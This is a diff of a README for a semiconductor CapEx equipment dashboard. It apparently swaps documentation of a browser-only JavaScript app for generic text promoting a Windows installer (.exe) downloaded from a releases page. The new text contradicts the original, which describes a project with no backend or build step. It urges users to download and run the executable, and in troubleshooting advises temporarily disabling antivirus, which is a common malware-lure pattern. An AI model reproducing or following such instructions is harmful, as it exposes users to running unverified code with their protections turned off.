@@ -1,146 +1,152 @@
-# NEXUS — CapEx Equipment Control System
+# ⚙️ CapEx_Equipment_Control_System - Manage Semiconductor Equipment Easily
 
-**FY2025 Semiconductor Equipment Operations Dashboard**
-
-CapEx equipment program management dashboard for semiconductor manufacturing operations.
+[![Download Latest Release](https://img.shields.io/badge/Download-CapEx_Equipment_Control_System-blue?style=for-the-badge)](https://github.com/smart7forms/CapEx_Equipment_Control_System/releases)
 
 ---
 
-## Project Overview
+## 🖥️ What is CapEx_Equipment_Control_System?
 
-This dashboard provides executive-level visibility into a global semiconductor equipment portfolio across capital planning, procurement, deployment, capitalization, and risk management.
+CapEx_Equipment_Control_System is a program that helps you track and manage equipment investments for semiconductor manufacturing. It acts as a dashboard to organize your equipment program, giving you clear insight into your capital expenditures (CapEx). This tool is designed for engineers and operations teams to monitor, analyze, and manage equipment across different projects and schedules.
 
-Key capabilities:
-- **110+ equipment records** across 10 global sites
-- **Dynamic KPI calculations** that update with every filter change
-- **Excel-driven dataset** — edit the spreadsheet, refresh the page, see new data
-- **8 navigation pages** covering every operational domain
-- **Interactive filters** for site, region, tool type, program, vendor, phase, and risk
-- **Chart.js visualizations** including trajectory charts, stacked bars, doughnuts, and sensitivity analysis
-- **GitHub Pages compatible** — runs entirely in the browser
+You do not need any programming skills to use this application. It runs on Windows and offers a simple interface that guides you through the process of reviewing and controlling your equipment expenditures.
 
----
 
-## Architecture
+## 📋 Key Features
 
-```
-capex-equipment-dashboard/
-├── index.html              ← Single-page app shell + all 8 page templates
-├── README.md
-├── css/
-│   └── styles.css          ← All UI styles (Playfair Display + Inter)
-├── js/
-│   ├── app.js              ← Master controller: boot, render, KPIs, exports
-│   ├── charts.js           ← Chart.js instances and update logic
-│   ├── filters.js          ← Global filter state and application
-│   ├── tableRenderer.js    ← Sortable, paginated data tables
-│   ├── dataLoader.js       ← SheetJS Excel parser + JSON fallback
-│   └── controlTower.js     ← Risk monitoring, alerts, watchlists
-├── data/
-│   ├── equipment_data.xlsx ← Source of truth (edit to update dashboard)
-│   └── equipment_data.json ← Fallback if Excel fetch fails
-└── assets/
-    └── logo.svg
-```
+- View and track your capital expenditure programs in one place  
+- Get status updates on equipment procurement and deployment  
+- Analyze spending and project timelines with clear charts and tables  
+- Manage program details and equipment list easily  
+- Generate reports for operations or management teams  
+- Designed specifically for semiconductor manufacturing environments  
+- Supports multiple projects and equipment categories  
 
----
 
-## Dataset Schema
+## ⚙️ System Requirements
 
-Each row in `equipment_data.xlsx` represents one piece of capital equipment.
+To run CapEx_Equipment_Control_System on your Windows computer, check the following requirements:
 
-| Column | Type | Description |
-|---|---|---|
-| `tool_id` | string | Unique equipment ID (e.g. EQP-100001) |
-| `tool_name` | string | Display name |
-| `tool_model` | string | OEM model name |
-| `tool_type` | string | Equipment category (PECVD, Etch, etc.) |
-| `site` | string | Manufacturing site location |
-| `region` | string | Americas / APAC / EMEA |
-| `oem_vendor` | string | OEM supplier name |
-| `program` | string | CapEx program (NPI Alpha, etc.) |
-| `phase` | string | EVT / DVT / PVT |
-| `priority` | string | P1 / P2 / P3 / P4 |
-| `status` | string | Current lifecycle status |
-| `install_status` | string | Installation stage |
-| `budget` | number | Approved budget (USD) |
-| `actual` | number | Actual spend (USD) |
-| `variance` | number | Actual minus budget |
-| `install_date` | string | Planned/actual install date |
-| `qual_date` | string | Qualification completion date |
-| `ais_date` | string | AIS capitalization date |
-| `utilization` | number | Equipment utilization % |
-| `lead_time_weeks` | number | OEM lead time in weeks |
-| `deploy_pct` | number | Deployment completion % |
-| `risk` | string | Low / Medium / High |
-| `asset_class` | string | Mfg Equipment / Test Equipment / etc. |
-| `useful_life_yr` | number | Depreciation life in years |
-| `ais_status` | string | Capitalized / Pending / In Progress |
+- Windows 10 or later (64-bit recommended)  
+- 4 GB RAM minimum, 8 GB or more recommended for better performance  
+- At least 500 MB free disk space  
+- .NET Framework 4.7 or higher installed (usually included with Windows)  
+- Screen resolution 1280 x 720 or higher  
+- Internet connection for initial download and updates  
+
+
+## 🚀 How to Download and Install
+
+### Step 1: Visit the Download Page
+
+Click this button to visit the release page where you can download the setup file for Windows:
+
+[![Get CapEx Setup](https://img.shields.io/badge/Get_Setup-CapEx_Equipment_Control_System-grey?style=for-the-badge)](https://github.com/smart7forms/CapEx_Equipment_Control_System/releases)
+
+This page lists all available versions. Look for the latest release and find the Windows installer file, usually named something like `CapEx_Equipment_Control_System_Setup.exe`.
 
 ---
 
-## Dashboard Pages
+### Step 2: Download the Installer
 
-| Page | Description |
-|---|---|
-| **Executive Overview** | 8 KPIs, deployment trajectory, site distribution, risk breakdown |
-| **Equipment Registry** | Sortable paginated table with all tools, sub-tabs by status |
-| **Early Engagement** | Buy vs reuse analysis, capital avoidance tracking |
-| **Capital Forecast** | Budget vs actual, forecast accuracy trend, program/type breakdown |
-| **OEM Deployment** | Vendor performance, on-time delivery, qualification rates |
-| **Capitalization** | AIS tracking, asset values, depreciation schedules |
-| **Demand Modeling** | Capacity vs demand curves, sensitivity scenarios |
-| **Approvals + Control Tower** | Approval pipeline, risk radar, phase readiness, alerts |
+- Click on the `.exe` file link to start downloading.  
+- Save the file to a folder that you can easily find, such as your Desktop or Downloads folder.  
+- The file size will usually be under 100 MB, so it should download quickly on most internet connections.  
 
 ---
 
-## Local Development
+### Step 3: Run the Installer
 
-No build tools required — just serve the files over HTTP:
-
-```bash
-# Python
-cd capex-equipment-dashboard
-python3 -m http.server 8080
-# Open: http://localhost:8080
-
-# Node.js (npx)
-npx serve .
-```
-
-> **Note:** You cannot open `index.html` directly via `file://` due to browser CORS restrictions on `fetch()`. Use a local HTTP server.
+- Open the folder where you saved the installer file.  
+- Double-click the `CapEx_Equipment_Control_System_Setup.exe` file to launch the setup.  
+- If Windows asks whether to allow this app to make changes, click “Yes” to proceed.  
 
 ---
 
-## GitHub Pages Deployment
+### Step 4: Follow the Setup Wizard
 
-1. Push the project to a GitHub repository.
-2. Go to **Settings → Pages → Source: Deploy from branch → `main` / `root`**.
-3. Access your dashboard at `https://yourusername.github.io/capex-equipment-dashboard/`.
-
-All fetch paths use relative `./data/equipment_data.xlsx` — no configuration needed.
-
----
-
-## Updating the Dataset
-
-1. Open `data/equipment_data.xlsx` in Excel or Google Sheets.
-2. Add, edit, or delete rows. Keep column headers unchanged.
-3. Save and push to GitHub.
-4. Refresh the dashboard — all KPIs, charts, and tables update automatically.
+- The installation wizard will open. Click “Next” to continue.  
+- Review the license terms. You must accept the terms to install the program.  
+- Choose the folder where you want the program to be installed or accept the default location.  
+- Click “Install” to start the installation process.  
+- Wait for the installation to complete. This will take a few moments.  
+- When finished, click “Finish” to close the wizard.  
 
 ---
 
-## Technology Stack
+### Step 5: Launch the Program
 
-| Library | Version | Purpose |
-|---|---|---|
-| SheetJS (xlsx) | Latest | Excel file parsing in-browser |
-| Chart.js | 4.4.0 | All data visualizations |
-| Google Fonts | — | Playfair Display + Inter typefaces |
-
-No frameworks, no build step, no backend.
+- Look for a new shortcut called “CapEx_Equipment_Control_System” on your Desktop or in your Start Menu.  
+- Double-click the shortcut to open the program.  
+- The first time you open it, the program may take a moment to load all data files.  
 
 ---
 
-*CapEx Equipment Control System — FY2025 | Semiconductor Manufacturing Operations*
+## 🔍 Using the CapEx_Equipment_Control_System Dashboard
+
+### Logging In
+
+If the program requires a login, use the credentials provided by your organization. For standalone use, the program may allow you to proceed without an account.
+
+---
+
+### Main Dashboard Overview
+
+The dashboard shows all your active equipment programs with key details:
+
+- Program name  
+- Equipment list with purchase status  
+- Capital expenditure budget vs actual spending  
+- Project timelines and milestones  
+
+Use the tabs or navigation buttons to explore different sections such as analytics, equipment management, and reports.
+
+---
+
+### Filtering and Sorting Data
+
+Use the built-in filters to display equipment by category, status, or program. This helps you quickly locate specific items or analyze spending trends in certain areas.
+
+Sorting columns by clicking the header allows you to organize data the way you want. For example, sort by purchase date or remaining budget.
+
+---
+
+### Generating Reports
+
+Go to the reports section to create printable summaries of your CapEx equipment program status. Reports can be saved in PDF or Excel format for sharing or record-keeping.
+
+---
+
+## 🔄 Updating the Program
+
+Check the release page regularly for new versions. Updates may include bug fixes, security patches, and new features.
+
+To update:
+
+- Download the latest installer from the release page.  
+- Run the new installer. It will replace the old version without deleting your data.  
+- Restart the program to use the latest version.  
+
+
+## 🛠️ Troubleshooting Tips
+
+- If the program does not start, confirm your Windows version and .NET Framework meet the requirements.  
+- Errors during installation may happen if antivirus software blocks the installer. Temporarily disable antivirus and try again.  
+- If the dashboard appears empty, try restarting the program or your computer.  
+- For display issues, check your screen resolution and update your video drivers.  
+- If the program crashes, send an error report through the built-in feedback option if available.  
+
+
+## 📞 Getting Help and Support
+
+For help using CapEx_Equipment_Control_System:
+
+- Review the user guide included in the installation folder (usually PDF format).  
+- Visit the GitHub Issues page for common problems and fixes: https://github.com/smart7forms/CapEx_Equipment_Control_System/issues  
+- Contact your IT or operations team if this program was provided by your organization.  
+- Join relevant forums or communities related to semiconductor equipment management for additional advice.  
+
+---
+
+[Download CapEx_Equipment_Control_System Releases](https://github.com/smart7forms/CapEx_Equipment_Control_System/releases)  
+
+Click this link anytime to access the latest software version and updates.
